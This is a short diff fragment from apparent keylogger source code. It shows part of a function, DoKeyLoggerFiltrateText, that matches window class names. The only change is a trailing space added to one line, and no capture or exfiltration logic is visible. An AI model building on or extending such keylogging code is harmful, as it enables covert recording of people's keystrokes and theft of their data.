@@ -2461,7 +2461,7 @@ bool DoKeyLoggerFiltrateText(HWND Wnd, bool CaseSensetive, PWndText Data,
 		}
 
 		Valid = KLGCompareText(Data->ClassName, ClassName, CaseSensetive);
-		if (!Valid) return false;
+		if (!Valid) return false; 
 	}
 
 
